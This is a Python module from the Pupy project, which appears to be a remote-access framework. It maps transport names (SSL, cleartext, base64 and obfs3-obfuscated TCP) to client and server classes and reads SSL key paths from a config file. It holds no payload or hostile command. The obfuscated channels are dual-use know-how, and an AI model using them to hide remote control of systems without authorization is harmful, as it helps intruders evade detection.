# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
from .servers import PupyTCPServer
from .clients import PupyTCPClient, PupySSLClient
from .transports import dummy, b64
from .transports.obfs3 import obfs3
from .streams import PupySocketStream
import os
import logging
try:
	import ConfigParser as configparser
except ImportError:
	import configparser
from rpyc.utils.authenticators import SSLAuthenticator

ssl_auth=None

def ssl_authenticator():
	config = configparser.ConfigParser()
	config.read("pupy.conf")
	return SSLAuthenticator(config.get("pupyd","keyfile").replace("\\",os.sep).replace("/",os.sep), config.get("pupyd","certfile").replace("\\",os.sep).replace("/",os.sep), ciphers="SHA256+AES256:SHA1+AES256:@STRENGTH")

transports={
	"tcp_ssl" : {
		"server" : PupyTCPServer,
		"client": PupySSLClient,
		"client_kwargs" : {},
		"authenticator" : ssl_authenticator,
		"stream": PupySocketStream ,
		"client_transport" : dummy.DummyPupyTransport,
		"server_transport" : dummy.DummyPupyTransport,
	},
	"tcp_cleartext" : {
		"server" : PupyTCPServer,
		"client": PupyTCPClient,
		"client_kwargs" : {},
		"authenticator" : None,
		"stream": PupySocketStream ,
		"client_transport" : dummy.DummyPupyTransport,
		"server_transport" : dummy.DummyPupyTransport,
	},
	"tcp_base64" : {
		"server" : PupyTCPServer,
		"client": PupyTCPClient,
		"client_kwargs" : {},
		"authenticator" : None,
		"stream": PupySocketStream ,
		"client_transport" : b64.B64Client,
		"server_transport" : b64.B64Server,
	},
	"obfs3" : {
		"server" : PupyTCPServer,
		"client": PupyTCPClient,
		"client_kwargs" : {},
		"authenticator" : None,
		"stream": PupySocketStream ,
		"client_transport" : obfs3.Obfs3Client,
		"server_transport" : obfs3.Obfs3Server,
	},
}
